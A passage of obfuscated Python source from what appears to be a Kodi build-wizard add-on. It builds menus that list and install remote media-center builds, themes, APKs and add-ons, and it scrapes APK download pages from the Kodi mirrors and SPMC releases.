		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2212
		addFile ('%s'%OO0000OOOOOOOOO00 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2213
	else :#line:2214
		O0O0OOO000O0OOOO0 ,OO0OOOOO0O0OOO000 ,OOOO00O00OO00O0OO ,OO0OO000OOOO00000 ,O0O000OOOOO0OOOOO ,O0O0OOO0OO00OOOO0 ,O0O0O00000O0O0O00 =wiz .buildCount ()#line:2215
		OO0O0OO000OOOOO0O =False ;OO0OO0OOO00OO00O0 =[]#line:2216
		if THIRDPARTY =='true':#line:2217
			if not THIRD1NAME ==''and not THIRD1URL =='':OO0O0OO000OOOOO0O =True ;OO0OO0OOO00OO00O0 .append ('1')#line:2218
			if not THIRD2NAME ==''and not THIRD2URL =='':OO0O0OO000OOOOO0O =True ;OO0OO0OOO00OO00O0 .append ('2')#line:2219
			if not THIRD3NAME ==''and not THIRD3URL =='':OO0O0OO000OOOOO0O =True ;OO0OO0OOO00OO00O0 .append ('3')#line:2220
		O0OO000OO00OOOOO0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2221
		O0OO0O00OOOOO000O =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OO000OO00OOOOO0 )#line:2222
		if O0O0OOO000O0OOOO0 ==1 and OO0O0OO000OOOOO0O ==False :#line:2223
			for O000O00000000OO0O ,OOO0O00000O000000 ,O000OO0O0OO0OOOOO ,O0OO0O000O00O0000 ,O0O000O00OOOO0OOO ,OO0O00OO0OOO0O0O0 ,O0O00OO0OOO000OO0 ,OOO0OO0O0OOOOO000 ,O00OO00O0O0OOO000 ,O000OOO0O0O0000OO in O0OO0O00OOOOO000O :#line:2224
				if not SHOWADULT =='true'and O00OO00O0O0OOO000 .lower ()=='yes':continue #line:2225
				if not DEVELOPER =='true'and wiz .strTest (O000O00000000OO0O ):continue #line:2226
				viewBuild (O0OO0O00OOOOO000O [0 ][0 ])#line:2227
				return #line:2228
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2231
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2232
		if OO0O0OO000OOOOO0O ==True :#line:2233
			for O00OO0000O00OOOO0 in OO0OO0OOO00OO00O0 :#line:2234
				O000O00000000OO0O =eval ('THIRD%sNAME'%O00OO0000O00OOOO0 )#line:2235
		if len (O0OO0O00OOOOO000O )>=1 :#line:2237
			if SEPERATE =='true':#line:2238
				for O000O00000000OO0O ,OOO0O00000O000000 ,O000OO0O0OO0OOOOO ,O0OO0O000O00O0000 ,O0O000O00OOOO0OOO ,OO0O00OO0OOO0O0O0 ,O0O00OO0OOO000OO0 ,OOO0OO0O0OOOOO000 ,O00OO00O0O0OOO000 ,O000OOO0O0O0000OO in O0OO0O00OOOOO000O :#line:2239
					if not SHOWADULT =='true'and O00OO00O0O0OOO000 .lower ()=='yes':continue #line:2240
					if not DEVELOPER =='true'and wiz .strTest (O000O00000000OO0O ):continue #line:2241
					OOO000OOO0O00OOO0 =createMenu ('install','',O000O00000000OO0O )#line:2242
					addDir ('[%s] %s (v%s)'%(float (O0O000O00OOOO0OOO ),O000O00000000OO0O ,OOO0O00000O000000 ),'viewbuild',O000O00000000OO0O ,description =O000OOO0O0O0000OO ,fanart =OOO0OO0O0OOOOO000 ,icon =O0O00OO0OOO000OO0 ,menu =OOO000OOO0O00OOO0 ,themeit =THEME2 )#line:2243
			else :#line:2244
				if OO0OO000OOOO00000 >0 :#line:2245
					OO000O0O0OO000000 ='+'if SHOW17 =='false'else '-'#line:2246
					if SHOW17 =='true':#line:2248
						for O000O00000000OO0O ,OOO0O00000O000000 ,O000OO0O0OO0OOOOO ,O0OO0O000O00O0000 ,O0O000O00OOOO0OOO ,OO0O00OO0OOO0O0O0 ,O0O00OO0OOO000OO0 ,OOO0OO0O0OOOOO000 ,O00OO00O0O0OOO000 ,O000OOO0O0O0000OO in O0OO0O00OOOOO000O :#line:2250
							if not SHOWADULT =='true'and O00OO00O0O0OOO000 .lower ()=='yes':continue #line:2251
							if not DEVELOPER =='true'and wiz .strTest (O000O00000000OO0O ):continue #line:2252
							OOOOO0OOOOOO0O0OO =int (float (O0O000O00OOOO0OOO ))#line:2253
							if OOOOO0OOOOOO0O0OO ==17 :#line:2254
								OOO000OOO0O00OOO0 =createMenu ('install','',O000O00000000OO0O )#line:2255
								addDir ('[%s] %s (v%s)'%(float (O0O000O00OOOO0OOO ),O000O00000000OO0O ,OOO0O00000O000000 ),'viewbuild',O000O00000000OO0O ,description =O000OOO0O0O0000OO ,fanart =OOO0OO0O0OOOOO000 ,icon =O0O00OO0OOO000OO0 ,menu =OOO000OOO0O00OOO0 ,themeit =THEME2 )#line:2256
				if O0O000OOOOO0OOOOO >0 :#line:2257
					OO000O0O0OO000000 ='+'if SHOW18 =='false'else '-'#line:2258
					if SHOW18 =='true':#line:2260
						for O000O00000000OO0O ,OOO0O00000O000000 ,O000OO0O0OO0OOOOO ,O0OO0O000O00O0000 ,O0O000O00OOOO0OOO ,OO0O00OO0OOO0O0O0 ,O0O00OO0OOO000OO0 ,OOO0OO0O0OOOOO000 ,O00OO00O0O0OOO000 ,O000OOO0O0O0000OO in O0OO0O00OOOOO000O :#line:2262
							if not SHOWADULT =='true'and O00OO00O0O0OOO000 .lower ()=='yes':continue #line:2263
							if not DEVELOPER =='true'and wiz .strTest (O000O00000000OO0O ):continue #line:2264
							OOOOO0OOOOOO0O0OO =int (float (O0O000O00OOOO0OOO ))#line:2265
							if OOOOO0OOOOOO0O0OO ==18 :#line:2266
								OOO000OOO0O00OOO0 =createMenu ('install','',O000O00000000OO0O )#line:2267
								addDir ('[%s] %s (v%s)'%(float (O0O000O00OOOO0OOO ),O000O00000000OO0O ,OOO0O00000O000000 ),'viewbuild',O000O00000000OO0O ,description =O000OOO0O0O0000OO ,fanart =OOO0OO0O0OOOOO000 ,icon =O0O00OO0OOO000OO0 ,menu =OOO000OOO0O00OOO0 ,themeit =THEME2 )#line:2268
				if OOOO00O00OO00O0OO >0 :#line:2269
					OO000O0O0OO000000 ='+'if SHOW16 =='false'else '-'#line:2270
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OO000O0O0OO000000 ,OOOO00O00OO00O0OO ),'togglesetting','show16',themeit =THEME3 )#line:2271
					if SHOW16 =='true':#line:2272
						for O000O00000000OO0O ,OOO0O00000O000000 ,O000OO0O0OO0OOOOO ,O0OO0O000O00O0000 ,O0O000O00OOOO0OOO ,OO0O00OO0OOO0O0O0 ,O0O00OO0OOO000OO0 ,OOO0OO0O0OOOOO000 ,O00OO00O0O0OOO000 ,O000OOO0O0O0000OO in O0OO0O00OOOOO000O :#line:2273
							if not SHOWADULT =='true'and O00OO00O0O0OOO000 .lower ()=='yes':continue #line:2274
							if not DEVELOPER =='true'and wiz .strTest (O000O00000000OO0O ):continue #line:2275
							OOOOO0OOOOOO0O0OO =int (float (O0O000O00OOOO0OOO ))#line:2276
							if OOOOO0OOOOOO0O0OO ==16 :#line:2277
								OOO000OOO0O00OOO0 =createMenu ('install','',O000O00000000OO0O )#line:2278
								addDir ('[%s] %s (v%s)'%(float (O0O000O00OOOO0OOO ),O000O00000000OO0O ,OOO0O00000O000000 ),'viewbuild',O000O00000000OO0O ,description =O000OOO0O0O0000OO ,fanart =OOO0OO0O0OOOOO000 ,icon =O0O00OO0OOO000OO0 ,menu =OOO000OOO0O00OOO0 ,themeit =THEME2 )#line:2279
				if OO0OOOOO0O0OOO000 >0 :#line:2280
					OO000O0O0OO000000 ='+'if SHOW15 =='false'else '-'#line:2281
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OO000O0O0OO000000 ,OO0OOOOO0O0OOO000 ),'togglesetting','show15',themeit =THEME3 )#line:2282
					if SHOW15 =='true':#line:2283
						for O000O00000000OO0O ,OOO0O00000O000000 ,O000OO0O0OO0OOOOO ,O0OO0O000O00O0000 ,O0O000O00OOOO0OOO ,OO0O00OO0OOO0O0O0 ,O0O00OO0OOO000OO0 ,OOO0OO0O0OOOOO000 ,O00OO00O0O0OOO000 ,O000OOO0O0O0000OO in O0OO0O00OOOOO000O :#line:2284
							if not SHOWADULT =='true'and O00OO00O0O0OOO000 .lower ()=='yes':continue #line:2285
							if not DEVELOPER =='true'and wiz .strTest (O000O00000000OO0O ):continue #line:2286
							OOOOO0OOOOOO0O0OO =int (float (O0O000O00OOOO0OOO ))#line:2287
							if OOOOO0OOOOOO0O0OO <=15 :#line:2288
								OOO000OOO0O00OOO0 =createMenu ('install','',O000O00000000OO0O )#line:2289
								addDir ('[%s] %s (v%s)'%(float (O0O000O00OOOO0OOO ),O000O00000000OO0O ,OOO0O00000O000000 ),'viewbuild',O000O00000000OO0O ,description =O000OOO0O0O0000OO ,fanart =OOO0OO0O0OOOOO000 ,icon =O0O00OO0OOO000OO0 ,menu =OOO000OOO0O00OOO0 ,themeit =THEME2 )#line:2290
		elif O0O0O00000O0O0O00 >0 :#line:2291
			if O0O0OOO0OO00OOOO0 >0 :#line:2292
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2293
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2294
			else :#line:2295
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2296
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2297
	setView ('files','viewType')#line:2298
def viewBuild (OO0O0O00OOOO0OOO0 ):#line:2300
	OOO0OOOO00000OOOO =wiz .workingURL (SPEEDFILE )#line:2301
	if not OOO0OOOO00000OOOO ==True :#line:2302
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2303
		addFile ('%s'%OOO0OOOO00000OOOO ,'',themeit =THEME3 )#line:2304
		return #line:2305
	if wiz .checkBuild (OO0O0O00OOOO0OOO0 ,'version')==False :#line:2306
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2307
		addFile ('%s was not found in the builds list.'%OO0O0O00OOOO0OOO0 ,'',themeit =THEME3 )#line:2308
		return #line:2309
	O00O0OOO0O00OO000 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2310
	O00O0000O00OOOO00 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO0O0O00OOOO0OOO0 ).findall (O00O0OOO0O00OO000 )#line:2311
	for OO00000OOOOO000O0 ,O00000OO00OO00OO0 ,OO00O0O00OOOOOOO0 ,OOOOO0OOOO0OO000O ,O0OO0OO0O00OO0OO0 ,O0O0000O00O00O0O0 ,OO00O00000O0O00OO ,OO00OO0OO0000O00O ,O0OOO0O00O0OOO000 ,OO000OO0O00OO0O00 in O00O0000O00OOOO00 :#line:2312
		O0O0000O00O00O0O0 =O0O0000O00O00O0O0 if wiz .workingURL (O0O0000O00O00O0O0 )else ICON #line:2313
		OO00O00000O0O00OO =OO00O00000O0O00OO if wiz .workingURL (OO00O00000O0O00OO )else FANART #line:2314
		OOO0OO0OOO0O0O0O0 ='%s (v%s)'%(OO0O0O00OOOO0OOO0 ,OO00000OOOOO000O0 )#line:2315
		if BUILDNAME ==OO0O0O00OOOO0OOO0 and OO00000OOOOO000O0 >BUILDVERSION :#line:2316
			OOO0OO0OOO0O0O0O0 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OOO0OO0OOO0O0O0O0 ,BUILDVERSION )#line:2317
		O000O0O0O0OO0OO0O =int (float (KODIV ));OO00O0000OO00O000 =int (float (OOOOO0OOOO0OO000O ))#line:2326
		if not O000O0O0O0OO0OO0O ==OO00O0000OO00O000 :#line:2327
			if O000O0O0O0OO0OO0O ==16 and OO00O0000OO00O000 <=15 :O0O00O0O0000O000O =False #line:2328
			else :O0O00O0O0000O000O =True #line:2329
		else :O0O00O0O0000O000O =False #line:2330
		addFile ('התקנה','install',OO0O0O00OOOO0OOO0 ,'fresh',description =OO000OO0O00OO0O00 ,fanart =OO00O00000O0O00OO ,icon =O0O0000O00O00O0O0 ,themeit =THEME1 )#line:2334
		if not O0OO0OO0O00OO0OO0 =='http://':#line:2337
			if wiz .workingURL (O0OO0OO0O00OO0OO0 )==True :#line:2338
				addFile (wiz .sep ('THEMES'),'',fanart =OO00O00000O0O00OO ,icon =O0O0000O00O00O0O0 ,themeit =THEME3 )#line:2339
				O00O0OOO0O00OO000 =wiz .openURL (O0OO0OO0O00OO0OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2340
				O00O0000O00OOOO00 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00O0OOO0O00OO000 )#line:2341
				for OOO000O0OO00OO000 ,O0000OO0OO000O00O ,OOOO0O0OO0000OOO0 ,O00OOO000OOO0O000 ,OO00000O0OOOOOO0O ,OO000OO0O00OO0O00 in O00O0000O00OOOO00 :#line:2342
					if not SHOWADULT =='true'and OO00000O0OOOOOO0O .lower ()=='yes':continue #line:2343
					OOOO0O0OO0000OOO0 =OOOO0O0OO0000OOO0 if OOOO0O0OO0000OOO0 =='http://'else O0O0000O00O00O0O0 #line:2344
					O00OOO000OOO0O000 =O00OOO000OOO0O000 if O00OOO000OOO0O000 =='http://'else OO00O00000O0O00OO #line:2345
					addFile (OOO000O0OO00OO000 if not OOO000O0OO00OO000 ==BUILDTHEME else "[B]%s (Installed)[/B]"%OOO000O0OO00OO000 ,'theme',OO0O0O00OOOO0OOO0 ,OOO000O0OO00OO000 ,description =OO000OO0O00OO0O00 ,fanart =O00OOO000OOO0O000 ,icon =OOOO0O0OO0000OOO0 ,themeit =THEME3 )#line:2346
	setView ('files','viewType')#line:2347
def viewThirdList (O0O0O000OOOOOO0OO ):#line:2349
	OOO00OO0O00O00O00 =eval ('THIRD%sNAME'%O0O0O000OOOOOO0OO )#line:2350
	O00O0O0OOOO000O00 =eval ('THIRD%sURL'%O0O0O000OOOOOO0OO )#line:2351
	O00OO000000000OO0 =wiz .workingURL (O00O0O0OOOO000O00 )#line:2352
	if not O00OO000000000OO0 ==True :#line:2353
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2354
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2355
	else :#line:2356
		OO0OO00OO0O0OOO00 ,O0000OO00000OO0OO =wiz .thirdParty (O00O0O0OOOO000O00 )#line:2357
		addFile ("[B]%s[/B]"%OOO00OO0O00O00O00 ,'',themeit =THEME3 )#line:2358
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2359
		if OO0OO00OO0O0OOO00 :#line:2360
			for OOO00OO0O00O00O00 ,OOOOO0000O000O0O0 ,O00O0O0OOOO000O00 ,OOOO0O0OO0OO000O0 ,O00OO0OO00OOO000O ,OO00OOO0000OO0O0O ,OO00O0O0OO00OO000 ,OOO0O0000O0O0O000 in O0000OO00000OO0OO :#line:2361
				if not SHOWADULT =='true'and OO00O0O0OO00OO000 .lower ()=='yes':continue #line:2362
				addFile ("[%s] %s v%s"%(OOOO0O0OO0OO000O0 ,OOO00OO0O00O00O00 ,OOOOO0000O000O0O0 ),'installthird',OOO00OO0O00O00O00 ,O00O0O0OOOO000O00 ,icon =O00OO0OO00OOO000O ,fanart =OO00OOO0000OO0O0O ,description =OOO0O0000O0O0O000 ,themeit =THEME2 )#line:2363
		else :#line:2364
			for OOO00OO0O00O00O00 ,O00O0O0OOOO000O00 ,O00OO0OO00OOO000O ,OO00OOO0000OO0O0O ,OOO0O0000O0O0O000 in O0000OO00000OO0OO :#line:2365
				addFile (OOO00OO0O00O00O00 ,'installthird',OOO00OO0O00O00O00 ,O00O0O0OOOO000O00 ,icon =O00OO0OO00OOO000O ,fanart =OO00OOO0000OO0O0O ,description =OOO0O0000O0O0O000 ,themeit =THEME2 )#line:2366
def editThirdParty (O00OOO0OOO00O00OO ):#line:2368
	O000O0OO00000OOOO =eval ('THIRD%sNAME'%O00OOO0OOO00O00OO )#line:2369
	O000000000O0OOO0O =eval ('THIRD%sURL'%O00OOO0OOO00O00OO )#line:2370
	O0OOOOO000O0O0O00 =wiz .getKeyboard (O000O0OO00000OOOO ,'Enter the Name of the Wizard')#line:2371
	O0OO00OOO0O0OOOOO =wiz .getKeyboard (O000000000O0OOO0O ,'Enter the URL of the Wizard Text')#line:2372
	wiz .setS ('wizard%sname'%O00OOO0OOO00O00OO ,O0OOOOO000O0O0O00 )#line:2374
	wiz .setS ('wizard%surl'%O00OOO0OOO00O00OO ,O0OO00OOO0O0OOOOO )#line:2375
def apkScraper (name =""):#line:2377
	if name =='kodi':#line:2378
		O000OO0000OO0O0O0 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2379
		OOO0OO0O0OOO0O000 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2380
		O0OO000OOO0000O00 =wiz .openURL (O000OO0000OO0O0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2381
		OOOOO000O00000OO0 =wiz .openURL (OOO0OO0O0OOO0O000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2382
		OOOO0OOO0O000OOOO =0 #line:2383
		OO0OOOO0OO000O0O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O0OO000OOO0000O00 )#line:2384
		OO0O0O00O0O0O0O00 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOOOO000O00000OO0 )#line:2385
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2387
		OOO00OO0O0O0O000O =False #line:2388
		for OO00O0000000OOO00 ,name ,OO0O0O00OOOO0000O ,OOOOOO00O0OO00O00 in OO0OOOO0OO000O0O0 :#line:2389
			if OO00O0000000OOO00 in ['../','old/']:continue #line:2390
			if not OO00O0000000OOO00 .endswith ('.apk'):continue #line:2391
			if not OO00O0000000OOO00 .find ('_')==-1 and OOO00OO0O0O0O000O ==True :continue #line:2392
			try :#line:2393
				O0000OOO0OO0OOOO0 =name .split ('-')#line:2394
				if not OO00O0000000OOO00 .find ('_')==-1 :#line:2395
					OOO00OO0O0O0O000O =True #line:2396
					OO00O0O000000OOO0 ,O0O0O00O0OOOO0000 =O0000OOO0OO0OOOO0 [2 ].split ('_')#line:2397
				else :#line:2398
					OO00O0O000000OOO0 =O0000OOO0OO0OOOO0 [2 ]#line:2399
					O0O0O00O0OOOO0000 =''#line:2400
				O000O0O0O00O0O0O0 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000OOO0OO0OOOO0 [0 ].title (),O0000OOO0OO0OOOO0 [1 ],O0O0O00O0OOOO0000 .upper (),OO00O0O000000OOO0 ,COLOR2 ,OO0O0O00OOOO0000O .replace (' ',''),COLOR1 ,OOOOOO00O0OO00O00 )#line:2401
				O00O0OO00OOO0O000 =urljoin (O000OO0000OO0O0O0 ,OO00O0000000OOO00 )#line:2402
				addFile (O000O0O0O00O0O0O0 ,'apkinstall',"%s v%s%s %s"%(O0000OOO0OO0OOOO0 [0 ].title (),O0000OOO0OO0OOOO0 [1 ],O0O0O00O0OOOO0000 .upper (),OO00O0O000000OOO0 ),O00O0OO00OOO0O000 )#line:2403
				OOOO0OOO0O000OOOO +=1 #line:2404
			except :#line:2405
				wiz .log ("Error on: %s"%name )#line:2406
		for OO00O0000000OOO00 ,name ,OO0O0O00OOOO0000O ,OOOOOO00O0OO00O00 in OO0O0O00O0O0O0O00 :#line:2408
			if OO00O0000000OOO00 in ['../','old/']:continue #line:2409
			if not OO00O0000000OOO00 .endswith ('.apk'):continue #line:2410
			if not OO00O0000000OOO00 .find ('_')==-1 :continue #line:2411
			try :#line:2412
				O0000OOO0OO0OOOO0 =name .split ('-')#line:2413
				O000O0O0O00O0O0O0 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000OOO0OO0OOOO0 [0 ].title (),O0000OOO0OO0OOOO0 [1 ],O0000OOO0OO0OOOO0 [2 ],COLOR2 ,OO0O0O00OOOO0000O .replace (' ',''),COLOR1 ,OOOOOO00O0OO00O00 )#line:2414
				O00O0OO00OOO0O000 =urljoin (OOO0OO0O0OOO0O000 ,OO00O0000000OOO00 )#line:2415
				addFile (O000O0O0O00O0O0O0 ,'apkinstall',"%s v%s %s"%(O0000OOO0OO0OOOO0 [0 ].title (),O0000OOO0OO0OOOO0 [1 ],O0000OOO0OO0OOOO0 [2 ]),O00O0OO00OOO0O000 )#line:2416
				OOOO0OOO0O000OOOO +=1 #line:2417
			except :#line:2418
				wiz .log ("Error on: %s"%name )#line:2419
		if OOOO0OOO0O000OOOO ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2420
	elif name =='spmc':#line:2421
		O000O00OO00000000 ='https://github.com/koying/SPMC/releases'#line:2422
		O0OO000OOO0000O00 =wiz .openURL (O000O00OO00000000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2423
		OOOO0OOO0O000OOOO =0 #line:2424
		OO0OOOO0OO000O0O0 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O0OO000OOO0000O00 )#line:2425
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2427
		for name ,OO0000OO0000O00OO in OO0OOOO0OO000O0O0 :#line:2429
			O000OOOOOO00OO0OO =''#line:2430
			OO0O0O00O0O0O0O00 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OO0000OO0000O00OO )#line:2431
			for OOOO0O00OOOOOOOOO ,OOOO0OO0000O00O00 ,OOO0OO0O00OO0O00O in OO0O0O00O0O0O0O00 :#line:2432
				if OOO0OO0O00OO0O00O .find ('armeabi')==-1 :continue #line:2433
				if OOO0OO0O00OO0O00O .find ('launcher')>-1 :continue #line:2434
				O000OOOOOO00OO0OO =urljoin ('https://github.com',OOOO0O00OOOOOOOOO )#line:2435
				break #line:2436
		if OOOO0OOO0O000OOOO ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2438
def apkMenu (url =None ):#line:2440
	if url ==None :#line:2441
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2444
	if not APKFILE =='http://':#line:2445
		if url ==None :#line:2446
			OO000OOO0O00OOO0O =wiz .workingURL (APKFILE )#line:2447
			OO00OOO0OO0OO0000 =uservar .APKFILE #line:2448
		else :#line:2449
			OO000OOO0O00OOO0O =wiz .workingURL (url )#line:2450
			OO00OOO0OO0OO0000 =url #line:2451
		if OO000OOO0O00OOO0O ==True :#line:2452
			O0OOOO00OO0O0O000 =wiz .openURL (OO00OOO0OO0OO0000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2453
			OOO0OO0000O0OO00O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OOOO00OO0O0O000 )#line:2454
			if len (OOO0OO0000O0OO00O )>0 :#line:2455
				O0OOO00OOOOO000OO =0 #line:2456
				for OO0O000O0O00O0OOO ,O0000000O000O00O0 ,url ,OO00OO0O000O00OOO ,OO0000OOOO0OOOO00 ,O000O000OO0O0O0O0 ,O0OOO0O0OOO000OO0 in OOO0OO0000O0OO00O :#line:2457
					if not SHOWADULT =='true'and O000O000OO0O0O0O0 .lower ()=='yes':continue #line:2458
					if O0000000O000O00O0 .lower ()=='yes':#line:2459
						O0OOO00OOOOO000OO +=1 #line:2460
						addDir ("[B]%s[/B]"%OO0O000O0O00O0OOO ,'apk',url ,description =O0OOO0O0OOO000OO0 ,icon =OO00OO0O000O00OOO ,fanart =OO0000OOOO0OOOO00 ,themeit =THEME3 )#line:2461
					else :#line:2462
						O0OOO00OOOOO000OO +=1 #line:2463
						addFile (OO0O000O0O00O0OOO ,'apkinstall',OO0O000O0O00O0OOO ,url ,description =O0OOO0O0OOO000OO0 ,icon =OO00OO0O000O00OOO ,fanart =OO0000OOOO0OOOO00 ,themeit =THEME2 )#line:2464
					if O0OOO00OOOOO000OO <1 :#line:2465
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2466
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2467
		else :#line:2468
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2469
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2470
			addFile ('%s'%OO000OOO0O00OOO0O ,'',themeit =THEME3 )#line:2471
		return #line:2472
	else :wiz .log ("[APK Menu] No APK list added.")#line:2473
	setView ('files','viewType')#line:2474
def addonMenu (url =None ):#line:2476
	if not ADDONFILE =='http://':#line:2477
		if url ==None :#line:2478
			O0000OOO00O0OO0OO =wiz .workingURL (ADDONFILE )#line:2479
			OOO0OO00O0O0000OO =uservar .ADDONFILE #line:2480
		else :#line:2481
			O0000OOO00O0OO0OO =wiz .workingURL (url )#line:2482
			OOO0OO00O0O0000OO =url #line:2483
		if O0000OOO00O0OO0OO ==True :#line:2484
			OO00000OOOOO00OO0 =wiz .openURL (OOO0OO00O0O0000OO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2485
			O0O0O000O0000O000 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO00000OOOOO00OO0 )#line:2486
			if len (O0O0O000O0000O000 )>0 :#line:2487
				OO00O00OO00OOOOOO =0 #line:2488
				for O0O00OOOO0OO00OO0 ,OO00O000OO000000O ,url ,OOOO00O00O0OOOO0O ,OOO00000OOOOOOOO0 ,O00OOOOOOO000O00O ,OOO000O000O00OOOO ,O00OOOO00O0OO0O0O ,OO0OOO00OO00O00O0 ,O00OOO0OOOOO00O00 in O0O0O000O0000O000 :#line:2489
					if OO00O000OO000000O .lower ()=='section':#line:2490
						OO00O00OO00OOOOOO +=1 #line:2491
						addDir ("[B]%s[/B]"%O0O00OOOO0OO00OO0 ,'addons',url ,description =O00OOO0OOOOO00O00 ,icon =OOO000O000O00OOOO ,fanart =O00OOOO00O0OO0O0O ,themeit =THEME3 )#line:2492
					else :#line:2493
						if not SHOWADULT =='true'and OO0OOO00OO00O00O0 .lower ()=='yes':continue #line:2494
						try :#line:2495
							O0O00O0OOOO00000O =xbmcaddon .Addon (id =OO00O000OO000000O ).getAddonInfo ('path')#line:2496
							if os .path .exists (O0O00O0OOOO00000O ):#line:2497
								O0O00OOOO0OO00OO0 ="[COLOR green][Installed][/COLOR] %s"%O0O00OOOO0OO00OO0 #line:2498
						except :#line:2499
							pass #line:2500
						OO00O00OO00OOOOOO +=1 #line:2501
						addFile (O0O00OOOO0OO00OO0 ,'addoninstall',OO00O000OO000000O ,OOO0OO00O0O0000OO ,description =O00OOO0OOOOO00O00 ,icon =OOO000O000O00OOOO ,fanart =O00OOOO00O0OO0O0O ,themeit =THEME2 )#line:2502
					if OO00O00OO00OOOOOO <1 :#line:2503
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2504
			else :#line:2505
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2506
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2507
		else :#line:2508
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2509
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2510
			addFile ('%s'%O0000OOO00O0OO0OO ,'',themeit =THEME3 )#line:2511
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2512
	setView ('files','viewType')#line:2513
def addonInstaller (OO0OO0O0O0000O0OO ,O0000O0OOO0O000OO ):#line:2515
	if not ADDONFILE =='http://':#line:2516
		OOO0000O0O00O0OO0 =wiz .workingURL (O0000O0OOO0O000OO )#line:2517
		if OOO0000O0O00O0OO0 ==True :#line:2518
			O000OOO000O00O000 =wiz .openURL (O0000O0OOO0O000OO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2519
